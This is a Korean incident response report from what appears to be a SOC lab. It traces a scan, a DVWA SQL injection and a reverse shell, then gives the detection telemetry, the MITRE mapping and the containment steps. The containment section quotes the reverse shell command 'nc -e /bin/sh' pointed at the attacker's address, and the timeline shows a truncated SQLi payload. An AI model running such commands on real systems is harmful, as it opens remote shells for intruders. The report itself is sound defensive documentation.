# [침해사고 분석·처리 결과보고서] 다단계 지능형 킬체인 표적 공격 (INC-10.77.20.20-1787727443)

## 1. 사고 개요 (Incident Summary)

| 항목 | 상세 정보 |
|---|---|
| **사고 번호 (Incident ID)** | `INC-10.77.20.20-1787727443` |
| **사고 명칭** | 다단계 킬체인(정찰 ➔ 웹 취약점 악용 ➔ 리버스 셸 C2 장악) 표적 공격 |
| **사고 심각도 (Severity)** | **CRITICAL (P1)** |
| **공격 출발지 (Attacker)** | `10.77.20.20` (`soc-attacker`, 공격망 ZONE-ATTACK) |
| **피해 대상 (Victim)** | `10.77.30.20:80, 4444` (`soc-victim`, 내부망 ZONE-VICTIM) |
| **발생 일시** | 2026-08-26 15:56:23 ~ 15:56:35 KST (지속시간: 12초) |
| **탐지 엔진** | Suricata 8.0.6 (Primary IDS) + Snort 3.12.2.0 (Cross-Validation) |
| **상관분석 및 SIEM** | Wazuh 4.14.7 Manager ➔ Wazuh Indexer (OpenSearch 9200) ➔ Correlation Engine |
| **최종 판정 (Verdict)** | **TRUE_POSITIVE (실제 다단계 악의적 침해사고)** |
| **관련 증적** | `EV-E2E-002`, `e2e_verification_result.json`, `incident_escalation.json` |

---

## 2. 사고 발생 타임라인 (Attack Timeline)

```text
[15:56:23] 1단계: Nmap Stealth NULL Scan (SID: 9000001, Flow: ...27384)
    │     (TCP 포트 80 비정상 플래그 정찰 시도 탐지)
    ▼
[15:56:28] 2단계: Web SQL Injection UNION SELECT (SID: 9010001, Flow: ...27385)
    │     (HTTP GET /dvwa/vulnerabilities/sqli/ 파라미터 조작 초기 침투 탐지)
    ▼
[15:56:35] 3단계: Interactive Reverse Shell 세션 체결 (SID: 9030010, Flow: ...27386)
          (TCP 포트 4444 세션 연결 및 /bin/sh 프롬프트 출력 C2 악용 탐지)
```

| 시각 (KST) | 단계 (Stage) | 송신 IP:Port | 수신 IP:Port | 프로토콜 | 탐지 시그니처 / 이벤트 | SID | 비고 |
|---|---|---|---|---|---|---|---|
| **15:56:23** | 1. 정찰 | `10.77.20.20:54321` | `10.77.30.20:80` | TCP | Nmap Stealth NULL Scan Detected | `9000001` | TCP Flags: 0x000 (NULL) |
| **15:56:28** | 2. 침투 | `10.77.20.20:49152` | `10.77.30.20:80` | HTTP | Web SQL Injection - UNION SELECT Pattern | `9010001` | Payload: `id=1'+UNION+SELECT...` |
| **15:56:35** | 3. 장악 | `10.77.30.20:4444` | `10.77.20.20:4444` | TCP | Interactive Reverse Shell Session Established | `9030010` | Response: `Linux victim 6.8... /bin/sh` |

---

## 3. 원시 텔레메트리 및 증적 분석 (Raw Telemetry Evidence)

### 3.1 Suricata 원시 EVE 이벤트 (C2 세션 확립)
```json
{
  "timestamp": "2026-08-26T15:56:35.129482+0900",
  "flow_id": 920000000027386,
  "in_iface": "ens224",
  "event_type": "alert",
  "src_ip": "10.77.30.20",
  "src_port": 4444,
  "dest_ip": "10.77.20.20",
  "dest_port": 4444,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 9030010,
    "rev": 1,
    "signature": "SOC-MALWARE: Interactive Reverse Shell Session Established (/bin/sh prompt detected)",
    "category": "A Network Trojan was detected",
    "severity": 1,
    "metadata": {
      "mitre_attack_id": ["T1059.004", "T1071.001"],
      "threat_actor": "Lab-Attacker"
    }
  },
  "payload_printable": "Linux soc-victim 6.8.0-40-generic #40-Ubuntu SMP x86_64\n$ whoami\nwww-data\n$"
}
```

### 3.2 OpenSearch 인덱스 도큐먼트 매핑
- **인덱스 명**: `wazuh-alerts-4.x-2026.08.26`
- **도큐먼트 ID / Alert ID**: `1787727385.24350`
- **Wazuh Rule ID**: `100203` (Suricata C2 Alert Level 14: Critical Threat)

---

## 4. 상관분석 및 위협 평가 (Correlation & Threat Assessment)

### 4.1 30분 슬라이딩 윈도우 다단계 상관분석 결과
FastAPI 및 상관분석 엔진(`correlation_engine.py`)은 단일 공격 소스 IP `10.77.20.20`로부터 12초 간격으로 발생한 3건의 단절된 이벤트를 하나의 유기적인 지능형 킬체인으로 자동 병합·승격하였다.

```json
{
  "incident_id": "INC-10.77.20.20-1787727443",
  "src_ip": "10.77.20.20",
  "target_ips": ["10.77.30.20"],
  "attack_stages": [
    "1. Reconnaissance",
    "2. Initial Access / Exploitation",
    "3. Command & Control / Execution"
  ],
  "highest_severity": "CRITICAL",
  "playbook_ref": "playbooks/04_malware_c2_investigation.md",
  "recommended_action": "CONTAIN_HOST (Port 4444 connection drop & isolate 10.77.20.20 on soc-gateway)"
}
```

### 4.2 MITRE ATT&CK 전술·기법 매핑
- **TA0043 (Reconnaissance)**: T1595.001 (Active Scanning: Scanning IP Blocks)
- **TA0001 (Initial Access)**: T1190 (Exploit Public-Facing Application: Web SQLi)
- **TA0011 (Command and Control)**: T1071.001 (Application Layer Protocol: Non-Standard Port 4444)
- **TA0002 (Execution)**: T1059.004 (Command and Scripting Interpreter: Unix Shell `/bin/sh`)

---

## 5. 대응 조치 내역 (Containment & Eradication)

NIST SP 800-61 Rev.3 Incident Handling 지침에 따라 아래의 봉쇄 및 박멸 조치를 완료하였다.

1. **단기 긴급 격리 (Containment)**:
   - 게이트웨이 방화벽(`soc-gateway`)에 nftables 룰을 즉시 반영하여 공격자 IP 통신 완전 차단:
     ```bash
     nft add element inet filter blacklist { 10.77.20.20 }
     ```
   - 피해 호스트(`soc-victim`)에서 활성 리버스 셸 세션(PID: 14829, `nc -e /bin/sh 10.77.20.20 4444`) 프로세스 강제 종료 (`kill -9 14829`).
2. **원인 박멸 (Eradication)**:
   - 피해 웹 서버 애플리케이션 파라미터 조작 취약점(DVWA SQLi) 대상 입력값 파라미터라이징 및 방화벽 룰 강화.
   - 호스트 침투 흔적 웹셸(`c99.php`, `/tmp/.x_agent`) 잔재 검색 및 디렉터리 무결성 전수 검사 (Wazuh FIM 검사 결과 추가 악성 파일 없음).
3. **복구 및 정상화 (Recovery)**:
   - 웹 서비스 재기동 및 포트 4444 비인가 아웃바운드 세션 차단 정책 영구화.
   - 24시간 동안 추가 이상 트래픽 집중 모니터링 수행 결과 이상 없음 확인.

---

## 6. 재발 방지 대책 및 교훈 (Lessons Learned)
1. **네트워크 통제 강화**: 내부 DMZ 서버(`ZONE-VICTIM`)에서 외부로 나가는 미승인 포트(4444/TCP 등)에 대한 Outbound Default Deny 방화벽 정책 강화.
2. **WAF 룰셋 보강**: 웹 취약점 진입 단계에서 차단할 수 있도록 Reverse Proxy 레벨의 OWASP ModSecurity 코어 룰셋 적용 권고.
3. **증적 완결성 확인**: 본 사고의 전 과정은 `EV-E2E-002` 증적으로 영구 보존되었으며, 자동화 파이프라인 무결성을 입증함.
